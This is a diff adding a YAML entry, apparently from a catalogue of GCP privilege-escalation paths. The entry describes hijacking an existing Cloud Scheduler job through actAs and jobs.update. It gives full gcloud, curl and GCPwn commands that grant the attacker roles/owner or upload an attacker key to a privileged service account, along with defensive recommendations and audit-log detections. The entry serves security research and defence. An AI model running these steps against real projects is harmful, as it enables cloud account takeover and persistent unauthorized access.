@@ -1,0 +1,278 @@
+id: gcp-cloudscheduler-002
+name: iam.serviceAccounts.actAs + cloudscheduler.jobs.update
+category: existing-actas
+services:
+- iam
+- cloudscheduler
+permissions:
+  required:
+  - permission: iam.serviceAccounts.actAs
+    resourceType: service-account
+    resourceConstraints: Must be granted on the new target service account being set on the job; Cloud Scheduler enforces actAs at update time (enforced by the Cloud Scheduler API when the OAuth/OIDC service account field is changed)
+  - permission: cloudscheduler.jobs.update
+    resourceType: cloudschedulerjob
+    resourceConstraints: Must be granted on the specific Cloud Scheduler job being updated or at the project level
+  - permission: cloudscheduler.jobs.get
+    resourceType: cloudschedulerjob
+    resourceConstraints: Required by the Cloud Scheduler API; enforced even when providing a full `httpTarget` body with `updateMask=httpTarget` — the caller cannot skip this permission by supplying a complete replacement body
+  additional:
+  - permission: cloudscheduler.jobs.run
+    resourceType: cloudschedulerjob
+    resourceConstraints: Needed to force-trigger the updated job immediately rather than waiting for the next scheduled execution
+  - permission: cloudscheduler.jobs.list
+    resourceType: cloudschedulerjob
+    resourceConstraints: Helpful for enumerating existing Cloud Scheduler jobs to identify victims whose `httpTarget` service account can be updated to a privileged SA
+  - permission: resourcemanager.projects.getIamPolicy
+    resourceConstraints: Needed to read the current project IAM policy so the update body for `projects.setIamPolicy` preserves all existing bindings; required for the safest exploitation path
+  - permission: iam.serviceAccounts.list
+    resourceConstraints: Helpful for enumerating service accounts in the project to identify privileged actAs targets
+  - permission: iam.serviceAccounts.getIamPolicy
+    resourceConstraints: Useful for inspecting service account IAM policies to identify accounts on which the attacker holds `iam.serviceAccounts.actAs`
+description: A principal with `iam.serviceAccounts.actAs` on a privileged service account, `cloudscheduler.jobs.update` on an existing Cloud Scheduler HTTP job, and `cloudscheduler.jobs.get` on that job can update it to change its OAuth identity (`httpTarget.oauthToken.serviceAccountEmail`) to the target service account and redirect its URI to a googleapis.com endpoint of the attacker's choosing. The Cloud Scheduler API enforces `cloudscheduler.jobs.get` on the caller even when a full `httpTarget` replacement body is provided with `updateMask=httpTarget`. Unlike Cloud Run or Cloud Functions, Cloud Scheduler does not execute arbitrary attacker code — when the job fires, it makes a single pre-configured HTTP request authenticated as the target SA to a googleapis.com endpoint. The `oauthToken` mechanism restricts the target URI to googleapis.com domains; the attacker cannot capture the bearer token at an external endpoint. The attack's value is the side-effect of the API call; by configuring the job to call `projects.setIamPolicy` with a body that adds the attacker's own principal to `roles/owner`, the attacker gains direct administrative access through their own identity without possessing the target SA's token. `iam.serviceAccounts.actAs` is enforced at update time by the Cloud Scheduler API.
+prerequisites:
+  admin:
+  - An existing Cloud Scheduler HTTP job must exist in the project on which the attacker holds `cloudscheduler.jobs.update`
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold a role that includes `resourcemanager.projects.setIamPolicy` (such as `roles/owner` or `roles/resourcemanager.projectIamAdmin`) to enable the `setIamPolicy` escalation path
+  - The Cloud Scheduler service agent token-creator prerequisite for the target SA must be satisfied (see `gcp-cloudscheduler-001` prerequisites)
+  lateral:
+  - An existing Cloud Scheduler HTTP job must exist on which the attacker holds `cloudscheduler.jobs.update`
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold permissions to call a Google API that provides useful access or a stepping stone
+exploitationSteps:
+  gcloud:
+  - step: 1
+    command: |
+      CURRENT_POLICY=$(gcloud projects get-iam-policy PROJECT_ID --format=json)
+      UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq \
+        '.bindings += [{"role":"roles/owner","members":["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]}]')
+      JOB_BODY=$(echo "{\"policy\": $UPDATED_POLICY}")
+    description: Read the current project IAM policy (requires the additional `resourcemanager.projects.getIamPolicy` permission) and append a new `roles/owner` binding for the attacker's service account. The full updated policy must be embedded in the job body to avoid overwriting existing project bindings.
+  - step: 2
+    command: |
+      gcloud scheduler jobs update http VICTIM_JOB_NAME \
+        --location=REGION \
+        --uri="https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy" \
+        --message-body="$JOB_BODY" \
+        --oauth-service-account-email=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --oauth-token-scope=https://www.googleapis.com/auth/cloud-platform \
+        --headers=Content-Type=application/json \
+        --project=PROJECT_ID
+    description: Update the existing Cloud Scheduler job to change its OAuth identity to the target SA and redirect its `uri` to `projects.setIamPolicy` with the attacker's updated IAM policy. Cloud Scheduler enforces `iam.serviceAccounts.actAs` on the new SA at update time. The `oauthToken` mechanism restricts the URI to googleapis.com domains; the token is never returned to the attacker — the escalation happens through the side-effect of the API call.
+  - step: 3
+    command: |
+      gcloud scheduler jobs run VICTIM_JOB_NAME \
+        --location=REGION \
+        --project=PROJECT_ID
+    description: Force-trigger the updated job immediately. Cloud Scheduler fires the authenticated `setIamPolicy` request within seconds as the target SA. This step requires the additional `cloudscheduler.jobs.run` permission; without it the attacker waits for the next cron tick.
+  - step: 4
+    command: |
+      gcloud projects get-iam-policy PROJECT_ID \
+        --flatten=bindings \
+        --filter="bindings.members:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com" \
+        --format="value(bindings.role)"
+    description: Verify that the attacker's service account now holds `roles/owner` on the project. The attacker can now authenticate as their own SA and perform any administrative operation directly.
+  curl:
+  - step: 1
+    command: |
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      CURRENT_POLICY=$(curl -sS \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy" \
+        -X POST -d '{}')
+      UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq \
+        '.bindings += [{"role":"roles/owner","members":["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]}]')
+      JOB_BODY_B64=$(echo "{\"policy\": $UPDATED_POLICY}" | base64 -w 0)
+    description: Read the current IAM policy and add the attacker's binding. Base64-encode the complete updated policy for embedding in the Cloud Scheduler job body (required by the raw REST API).
+  - step: 2
+    command: |
+      UPDATE_BODY=$(jq -n \
+        --arg sa "TARGET_SA@PROJECT_ID.iam.gserviceaccount.com" \
+        --arg body "$JOB_BODY_B64" \
+        '{
+          httpTarget: {
+            uri: "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy",
+            httpMethod: "POST",
+            body: $body,
+            headers: {"Content-Type": "application/json"},
+            oauthToken: {
+              serviceAccountEmail: $sa,
+              scope: "https://www.googleapis.com/auth/cloud-platform"
+            }
+          }
+        }')
+      UPDATE_RESPONSE=$(curl -sS -X PATCH \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudscheduler.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/jobs/VICTIM_JOB_NAME?updateMask=httpTarget" \
+        -d "$UPDATE_BODY")
+      echo "$UPDATE_RESPONSE" | jq -r '.name, .state'
+    description: Update the job via PATCH with `updateMask=httpTarget`. Cloud Scheduler checks both `cloudscheduler.jobs.get` and `iam.serviceAccounts.actAs` on the new SA at this step — `cloudscheduler.jobs.get` is enforced by the API even when providing a full replacement body.
+  - step: 3
+    command: |
+      curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://cloudscheduler.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/jobs/VICTIM_JOB_NAME:run"
+    description: Force-trigger the updated job. Cloud Scheduler fires the authenticated `setIamPolicy` call as the target SA, adding the attacker's principal to `roles/owner`. Requires the additional `cloudscheduler.jobs.run` permission.
+  - step: 4
+    command: |
+      curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy" \
+        -d '{}' | jq '.bindings[] | select(.members[] | contains("ATTACKER_SA@PROJECT_ID"))'
+    description: Confirm that the attacker's SA now appears in the project's `roles/owner` binding. The attacker has direct administrative access through their own principal.
+  - step: 5
+    command: |
+      openssl genrsa -out /tmp/pe_sa_key.pem 2048
+      openssl rsa -in /tmp/pe_sa_key.pem -pubout -outform DER -out /tmp/pe_sa_key.der
+      PUB_KEY_B64=$(base64 -w 0 /tmp/pe_sa_key.der)
+      KEY_BODY_B64=$(echo "{\"publicKeyData\": \"$PUB_KEY_B64\"}" | base64 -w 0)
+    description: "Alternative: upload an attacker-controlled RSA public key to the target SA for a persistent credential. Generate the RSA key pair locally — the private key stays on the attacker's machine. The DER-format public key is base64-encoded and embedded in the `keys:upload` request body, which is itself base64-encoded for the Cloud Scheduler body field. Requires the target SA to hold `iam.serviceAccountKeys.create` on itself."
+  - step: 6
+    command: |
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      UPDATE_KEY_BODY=$(jq -n \
+        --arg sa "TARGET_SA@PROJECT_ID.iam.gserviceaccount.com" \
+        --arg body "$KEY_BODY_B64" \
+        '{
+          httpTarget: {
+            uri: ("https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts/" + $sa + "/keys:upload"),
+            httpMethod: "POST",
+            body: $body,
+            headers: {"Content-Type": "application/json"},
+            oauthToken: {
+              serviceAccountEmail: $sa,
+              scope: "https://www.googleapis.com/auth/cloud-platform"
+            }
+          }
+        }')
+      curl -sS -X PATCH \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudscheduler.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/jobs/VICTIM_JOB_NAME?updateMask=httpTarget" \
+        -d "$UPDATE_KEY_BODY"
+      curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://cloudscheduler.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/jobs/VICTIM_JOB_NAME:run"
+    description: Redirect the existing job's `httpTarget` to call `serviceAccounts.keys.create` (upload public key) as the target SA — the job authenticates as the target SA and calls `keys:upload` on itself — then immediately fires it. `iam.googleapis.com` is a googleapis.com domain, so `oauthToken` is valid here.
+  - step: 7
+    command: |
+      gcloud auth activate-service-account \
+        TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --key-file=/tmp/pe_sa_key.pem
+      TARGET_SA_TOKEN=$(gcloud auth print-access-token)
+      curl -H "Authorization: Bearer $TARGET_SA_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Authenticate as the target SA using the locally held private key. This yields a durable credential for the target SA's own identity that persists even if the attacker's `iam.serviceAccounts.actAs` grant is later revoked.
+  gcpwn:
+  - step: 1
+    command: |
+      modules run exploit_cloudscheduler_job \
+        --update \
+        --existing-job VICTIM_JOB_NAME \
+        --target-sa TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --action make-admin \
+        --project PROJECT_ID \
+        --region REGION \
+        --read-response
+    description: "GCPwn's Cloud Scheduler exploit module in UPDATE mode. `--update --existing-job VICTIM_JOB_NAME` redirects an existing job's `httpTarget` to the target SA, then fires it immediately. `--action make-admin` automatically reads the current project IAM policy, appends a `roles/owner` binding for the calling SA, and constructs the `setIamPolicy` body. `--read-response` polls the Scheduler API after firing to confirm the HTTP call returned 2xx. The module records `cloudscheduler.jobs.update`, `cloudscheduler.jobs.get`, and `iam.serviceAccounts.actAs` as confirmed permissions. All other actions supported by CREATE mode (`--action create-sa-key`, `--action set-iam-binding`, `--action custom`, `--url`) work identically in UPDATE mode."
+  - step: 2
+    command: |
+      gcloud projects get-iam-policy PROJECT_ID \
+        --flatten=bindings \
+        --filter="bindings.members:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com" \
+        --format="value(bindings.role)"
+    description: Verify that the attacker's service account now holds `roles/owner` on the project.
+recommendation: |
+  High-powered service accounts combined with overly broad `iam.serviceAccounts.actAs` and `cloudscheduler.jobs.update` is what makes this privilege escalation path exploitable.
+
+  - **Avoid privileged service accounts in Cloud Scheduler jobs** — Scope each scheduled job to a dedicated service account with only the permissions its tasks require.
+  - **Grant `cloudscheduler.jobs.update` only on specific jobs, not at project scope** — Use resource-level IAM bindings on individual jobs rather than a broad project-level scheduler role that covers all jobs.
+  - **Grant `iam.serviceAccounts.actAs` on specific service accounts, not at project scope** — Bind `roles/iam.serviceAccountUser` on the individual service account, never at the project or folder level.
+  - Monitor Cloud Audit Logs for `google.cloud.scheduler.v1.CloudScheduler.UpdateJob` events that change `httpTarget.oauthToken.serviceAccountEmail` or `httpTarget.oidcToken.serviceAccountEmail`, especially where the new SA has broad project roles.
+  - Alert on Cloud Scheduler job updates that change the `httpTarget.uri` to privileged googleapis.com endpoints such as `cloudresourcemanager.googleapis.com/.../setIamPolicy` or `iam.googleapis.com/.../keys`.
+  - Periodically audit Cloud Scheduler job configurations to detect unauthorized changes to the OAuth/OIDC service account or target URI.
+  - Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants and `cloudscheduler.jobs.update` grants.
+limitations: |
+  An existing Cloud Scheduler HTTP job must be present and the attacker must hold `cloudscheduler.jobs.update` and `cloudscheduler.jobs.get` on it. A project with no HTTP-type Cloud Scheduler jobs (only Pub/Sub or App Engine targets) is not exploitable via this path.
+
+  Unlike Cloud Run or Cloud Functions privilege escalation paths, Cloud Scheduler does not execute arbitrary attacker code, and the `oauthToken` mechanism restricts the target URI to googleapis.com domains. The attacker cannot capture the bearer token at an external endpoint; the entire value is in the side-effect of the single pre-configured API call. The attacker must know in advance what API call to make and what request body to include. Updating an existing job with a new `httpTarget` URI and SA will disrupt any legitimate consumer that depended on the original job's behavior, which may be detectable.
+
+  The exploitation steps show `projects.setIamPolicy` as the example API call, but the target URI can be any googleapis.com endpoint the target SA has permission to call. Other high-value examples include: `iam.googleapis.com` to create a service account key (`serviceAccounts.keys.create`) or create a new service account (`serviceAccounts.create`), `storage.googleapis.com` to read sensitive bucket contents, or any other Google API that provides a useful capability or stepping stone based on the target SA's roles.
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: NetSPI
+    source: gcpwn
+    date: 2024
+    link: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json
+references:
+- title: GCPwn UPDATE_SCHEDULER_JOB_AS_SA OpenGraph edge - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json
+- title: GCPwn Cloud Scheduler exploitation module - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/modules/gcp/cloudscheduler/exploit
+- title: Configuring HTTP target authentication - Google Cloud Scheduler
+  url: https://cloud.google.com/scheduler/docs/configuring/http-auth
+- title: Jobs.patch REST reference - Google Cloud Scheduler API
+  url: https://cloud.google.com/scheduler/docs/reference/rest/v1/projects.locations.jobs/patch
+relatedPaths:
+- gcp-cloudscheduler-001
+- gcp-cloudbuild-001
+- gcp-cloudrunserviceimages-002
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The attacker holds `iam.serviceAccounts.actAs` on a target service account and `cloudscheduler.jobs.update` on an existing HTTP-type Cloud Scheduler job. Cloud Scheduler enforces actAs at update time.
+  - id: victim_job
+    label: Existing Cloud Scheduler HTTP Job
+    type: resource
+    description: An existing Cloud Scheduler HTTP job that the attacker modifies. The attacker updates its `httpTarget.oauthToken.serviceAccountEmail` to the privileged target SA and its `uri` to a googleapis.com endpoint. The Cloud Scheduler API enforces `cloudscheduler.jobs.get` on the caller at update time, even when providing a full `httpTarget` replacement body with `updateMask=httpTarget`.
+  - id: api_call
+    label: Authenticated Google API Call
+    type: payload
+    color: '#99ccff'
+    description: When the updated job fires, Cloud Scheduler's service agent mints a token for the new target SA and sends the outbound HTTP request to the configured googleapis.com endpoint. The attacker does not receive the token; the value is in the side-effect of the API call executing with the target SA's permissions.
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    color: '#99ff99'
+    description: The API call grants the attacker direct administrative access — for example, `projects.setIamPolicy` adding the attacker's SA to `roles/owner`. The attacker then uses their own identity for all further operations.
+  - id: limited_access
+    label: Limited Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: The API call grants some useful but non-administrative access, potentially enabling a follow-on escalation step.
+  - id: no_access
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: The target SA lacks the specific permission for the chosen API endpoint, or the call does not produce a useful change in the attacker's access.
+  edges:
+  - from: start
+    to: victim_job
+    label: iam.serviceAccounts.actAs + cloudscheduler.jobs.update
+    description: The attacker patches the existing job's `httpTarget` to point to the target SA and a googleapis.com API endpoint. Cloud Scheduler enforces actAs on the new SA at update time, and `cloudscheduler.jobs.get` is required by the API even when providing a full replacement `httpTarget` body.
+  - from: victim_job
+    to: api_call
+    label: Job fires on schedule or on demand
+    description: The updated job executes at its scheduled time, or immediately if the attacker forces execution with `cloudscheduler.jobs.run`. Cloud Scheduler authenticates as the new target SA and fires the HTTP request to the configured endpoint.
+  - from: api_call
+    to: admin
+    label: If API call grants attacker administrative access
+    branch: A
+    condition: admin
+    description: If the API call modifies IAM state to give the attacker direct project admin access (e.g. `setIamPolicy`), the attacker gains full project control through their own identity.
+  - from: api_call
+    to: limited_access
+    label: If API call grants narrower access
+    branch: B
+    condition: some_permissions
+    description: The API call grants some useful but non-administrative access that may enable further escalation.
+  - from: api_call
+    to: no_access
+    label: If API call does not grant useful access
+    branch: C
+    condition: no_permissions
+    description: The target SA lacks the needed permission for the chosen endpoint, or the call produces no useful change in the attacker's access.
